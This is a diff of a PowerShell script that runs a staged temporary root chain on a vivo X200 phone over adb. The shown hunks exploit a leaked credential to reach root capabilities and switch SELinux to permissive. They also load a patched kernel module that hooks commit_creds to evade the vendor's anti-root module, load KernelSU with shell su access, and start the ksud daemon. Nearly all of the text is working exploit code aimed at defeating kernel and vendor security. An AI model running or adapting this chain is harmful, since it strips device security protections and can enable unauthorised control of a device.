@@ -11,8 +11,9 @@ param(
   [string]$GltPath,    # override glt binary (default: prebuilt/glt_esync; 机型模块可带)
   [string]$ProfilePath, # override 机型模块 device.json (live 元数据用; 可选)
   [switch]$SkipPermissiveRestore, # do NOT load permissive_restore.ko; keep enforcing (network may break)
-  [switch]$SkipUptimeWait         # skip the 240s uptime stability wait (risk: device may not be settled)
-)
+  [switch]$SkipUptimeWait,        # skip the 240s uptime stability wait (risk: device may not be settled)
+  [switch]$SkipStage67            # debug: stop after STAGE5 CAPSROOT, do NOT load modules/kernelsu
+  )
 $ErrorActionPreference = 'SilentlyContinue'
 # ============================================================
 # root_full_permissive_restore.ps1 - vivo X200 (PD2415/b57) temporary root chain
@@ -78,6 +79,7 @@ if (-not $KO_OFFICIAL) { $KO_OFFICIAL = Resolve-Asset "modules\kernelsu\kernelsu
 $PERM_RESTORE_SRC   = $null
 $PERM_RESTORE_SRC   = $PermRestorePath
 if (-not $PERM_RESTORE_SRC -and -not $SkipPermissiveRestore) { $PERM_RESTORE_SRC = Resolve-Asset "modules\permissive_restore\permissive_restore.ko" }
+$CLEAR_VR_TAG_SRC   = Resolve-Asset "modules\clear_vr_tag\clear_vr_tag.ko"
 $KSUD         = Resolve-Asset "prebuilt\ksud"
 $GLT          = $GltPath
 if (-not $GLT) { $GLT = Resolve-Asset "prebuilt\glt_esync" }
@@ -97,6 +99,7 @@ $dev_glt    = "/data/local/tmp/glt_$tag"
 $dev_w2     = "/data/local/tmp/w2host_$tag"
 $dev_ksud   = "/data/local/tmp/ksud_$tag"
 $dev_perm_restore = "/data/local/tmp/permrestore_$tag.ko"
+$dev_clear_vr_tag = "/data/local/tmp/clearvr_$tag.ko"
 $dev_ksu    = "/data/local/tmp/kernelsu_$tag.ko"
 $dev_sock   = "/data/local/tmp/rootcmd_$tag.sock"
 $dev_w2log  = "/data/local/tmp/w2h_$tag.log"
@@ -146,6 +149,10 @@ function Get-GLLock {
     if ($lines.Count -ge 2) { $sbid = $lines[0].Trim(); $slot = [int]$lines[1] }
   }
   if ($bid -ne $sbid) { $slot = 0; $sbid = $bid }   # 重启 -> bss 清零 -> 槽位重置
+  # debug 修复: slot 1 (zeroes+0x10) 宿主有毒 (STAGE1/STAGE2 用它均 panic,
+  # 手机端 fast_chain/_device_script 实证 "slot 1 宿主有毒, 跳过").
+  # 重启后 boot_id 重置 -> STAGE2 必用 slot 1 -> 高频 panic (15:16/15:23/15:34 实证).
+  if ($slot -eq 1) { $slot = 2 }
   $lock = ('0x{0:x}' -f ([Convert]::ToUInt64($GL_LOCK_BASE,16) + $slot * $GL_LOCK_SLOT_SIZE))
   Set-Content $GL_STATE ("$sbid`n$($slot + 1)")
   # 根因修复: 必须用 Write-Host 而非 Write-Output!
@@ -315,6 +322,16 @@ if ($PERM_RESTORE_SRC) {
 } else {
   Write-Output "STAGE3.5 SKIP: -SkipPermissiveRestore (permissive_restore.ko not repatched/pushed)"
 }
+# clear_vr_tag.ko: vr.ko 反 root 对抗 (kretprobe commit_creds -> 清 task+0x06/0x2c
+#   + thread_info 0x400 位). 无它时 KernelSU 的 libksud.so 提权进程 (commit_creds
+#   -> vr.ko 标记 -> syscall_trace_exit inline hook do_exit 杀) -> manager
+#   "获取 root 失败" + UI 空白. 本模块让提权进程免于被杀.
+$CLEAR_VR_TAG_PATCHED = Join-Path $env:TEMP "clearvr_patched_now.ko"
+& $python $PATCH_ALL $CLEAR_VR_TAG_SRC $KSYM_OUT $CLEAR_VR_TAG_PATCHED 2>&1 | Select-Object -Last 3 | ForEach-Object { Write-Output "patch clear_vr_tag: $_" }
+if (-not (Test-Path $CLEAR_VR_TAG_PATCHED)) { Write-Output "STAGE3.5 FAIL: clear_vr_tag patch no output"; exit 1 }
+Adb "push $CLEAR_VR_TAG_PATCHED $dev_clear_vr_tag" | Out-Null
+Shell "chmod 644 $dev_clear_vr_tag"
+Write-Output "STAGE3.5: clear_vr_tag.ko ($((Get-Item $CLEAR_VR_TAG_PATCHED).Length)B) pushed"
 Mark "STAGE3.5 OK"
 
 # ---- STAGE4+5: w2host cred 泄漏 + CAPSROOT (参数化重试, 每轮新 cred+新槽位) ----
@@ -365,6 +382,11 @@ Start-Sleep -Seconds 3
 if (-not (Alive)) { Write-Output "STAGE5 DEVICE DOWN after CAPSROOT"; exit 1 }
 Shell ("echo 'STAGE5 OK cred=$cred' >> $dev_seq")
 Write-Output "STAGE5 OK: CAPSROOT cred=$cred"
+if ($SkipStage67) {
+  Write-Output "STAGE5 OK (SkipStage67): CAPSROOT ready, modules/kernelsu SKIPPED (debug)"
+  Mark "STAGE5 OK (SkipStage67)"
+  exit 0
+}
 
 # ---- STAGE6: rootcmd + INSMOD permissive_restore (init 清零 GL 宿主) -> INSMOD 官方 ko ----
 # 无限提权: 无论 permissive_restore 是否已加载, 都 rmmod + 重载新版
@@ -437,8 +459,11 @@ if ($PERM_RESTORE_SRC) {
 if ($mods_now -match 'kernelsu') {
   Write-Output "STAGE6: kernelsu already loaded, skip INSMOD"
 } elseif ($KO_OFFICIAL) {
-  Write-Output "STAGE6: INSMOD $dev_ksu (kernelsu) ..."
-  $r = Rootcmd "INSMOD $dev_ksu"
+  # allow_shell=1: KernelSU 原生参数 -> adb shell(uid 2000) 直接允许 su
+  # (sucompat 重定向生效) -> STAGE8 用 `su -c` 启动 ksud daemon.
+  # 比写 /data/adb/ksu/.allowlist 更干净: 不碰 KernelSU 配置, 侵入最小.
+  Write-Output "STAGE6: INSMOD $dev_ksu (kernelsu allow_shell=1) ..."
+  $r = Rootcmd "INSMOD $dev_ksu allow_shell=1"
   Write-Output "INSMOD kernelsu ret: $r"
   Start-Sleep -Seconds 6
   if (-not (Alive)) { Write-Output "STAGE6 DEVICE DOWN after kernelsu INSMOD"; exit 1 }
@@ -452,6 +477,44 @@ if ($mods_now -match 'kernelsu') {
 $bid = (Shell "cat /proc/sys/kernel/random/boot_id 2>/dev/null").Trim()
 if ($bid -and $PERM_RESTORE_SRC) { Set-Content $GL_STATE ("$bid`n0"); Write-Output "STAGE6: GL 宿主已清零, 槽位重置 -> 无限提权" }
 elseif ($bid) { Write-Output "STAGE6: -SkipPermissiveRestore, GL 宿主未清零 (槽位状态保留)" }
+
+# ---- STAGE6.5: vr.ko 反 root 对抗 (clear_vr_tag) ----
+# 必须在内核/manager 使用前加载: kretprobe commit_creds 只在"非root->root"
+# 提权时清 vr 标记 + TIF_SYSCALL_TRACEPOINT, 否则 KernelSU libksud.so 提权
+# 进程被 vr.ko 在 sys_exit 杀 -> manager "获取 root 失败" + UI 空白.
+$cc_addr = ''
+foreach ($line in (Get-Content $KSYM_OUT)) {
+  if ($line -match '^\s*([0-9a-fA-F]+)\s+T\s+commit_creds\s*$') { $cc_addr = '0x' + $matches[1]; break }
+}
+if ($cc_addr) {
+  if ((Shell "cat /proc/modules 2>/dev/null | grep -E '^clear_vr_tag'") -match 'clear_vr_tag') {
+    Write-Output "STAGE6.5: clear_vr_tag already loaded, skip INSMOD"
+  } else {
+    # vr.ko 对抗偏移: 默认 b57 实证值 (0x06/0x2c/0x400); 若有
+    # tools/offset_tools/extract_vr_offsets.py 生成的 vr_offsets.json
+    # (输入对应固件 vr.ko), 自动覆盖为提取值.
+    $vrTagA = 6; $vrTagB = 44; $vrTp = 1024
+    $VR_OFFS = Join-Path $PSScriptRoot "vr_offsets.json"
+    if (Test-Path $VR_OFFS) {
+      try {
+        $vro = Get-Content $VR_OFFS -Raw | ConvertFrom-Json
+        $vrTagA = [Convert]::ToInt32($vro.tag_a_off)
+        $vrTagB = [Convert]::ToInt32($vro.tag_b_off)
+        $vrTp   = [Convert]::ToInt32($vro.tp_flag)
+        Write-Output "STAGE6.5: vr offsets from vr_offsets.json (tag_a=$vrTagA tag_b=$vrTagB tp=$vrTp)"
+      } catch { Write-Output "STAGE6.5 WARN: vr_offsets.json parse failed, using defaults" }
+    }
+    Write-Output "STAGE6.5: INSMOD clear_vr_tag cc_addr=$cc_addr tag_a=$vrTagA tag_b=$vrTagB tp=$vrTp ..."
+    $r = Rootcmd "INSMOD $dev_clear_vr_tag cc_addr=$cc_addr tag_a_off=$vrTagA tag_b_off=$vrTagB tp_flag=$vrTp"
+    Write-Output "INSMOD clear_vr_tag ret: $r"
+    Start-Sleep -Seconds 2
+    $m = Shell "cat /proc/modules 2>/dev/null | grep '^clear_vr_tag'"
+    if ($m -notmatch 'clear_vr_tag') { Write-Output "STAGE6.5 WARN: clear_vr_tag not loaded: '$m'" }
+    else { Write-Output "STAGE6.5 OK: $m" }
+  }
+} else {
+  Write-Output "STAGE6.5 WARN: commit_creds not found in kallsyms - clear_vr_tag skipped"
+}
 
 # ---- STAGE7: 等 permissive_restore 延迟线程 (25s) 恢复 permissive + 全量验证 ----
 if ($PERM_RESTORE_SRC) {
@@ -487,3 +550,23 @@ if ($KO_OFFICIAL) {
   Write-Output "=== ALL STAGES PASS (no KSU): Permissive + $DEV_MOD Live + 网络通 ==="
 }
 Shell ("echo 'ALL STAGES PASS host=" + (Get-Date -Format "HH:mm:ss") + "' >> $dev_seq") | Out-Null
+
+# ---- STAGE8: 启动 ksud daemon (模块页/超级用户页依赖) ----
+# allowlist(uid 2000) + sucompat -> `su -c` 以 root + su 域执行 -> 启动
+# /data/adb/ksud services (daemon). 无它时 manager 模块页/超级用户页转圈.
+$su_test = Shell "su -c 'id' 2>&1 | head -1"
+if ($su_test -match 'uid=0') {
+  Write-Output "STAGE8: su works ($su_test), starting ksud daemon ..."
+  Shell "su -c 'nohup /data/adb/ksud services > /data/local/tmp/ksud_$tag.log 2>&1 &'"
+  Start-Sleep -Seconds 3
+  $ksud = Shell "ps -A 2>/dev/null | grep -E '^[ ]*[0-9]+ .*ksud' | head -2"
+  if ($ksud) { Write-Output "STAGE8 OK: ksud daemon up: $ksud" }
+  else {
+    Write-Output "STAGE8 WARN: ksud daemon not detected"
+    $kl = Shell "cat /data/local/tmp/ksud_$tag.log 2>/dev/null | head -5"
+    Write-Output "ksud log: $kl"
+  }
+} else {
+  Write-Output "STAGE8 WARN: su not working for shell ($su_test) - ksud daemon skipped"
+}
+Write-Output "DONE"
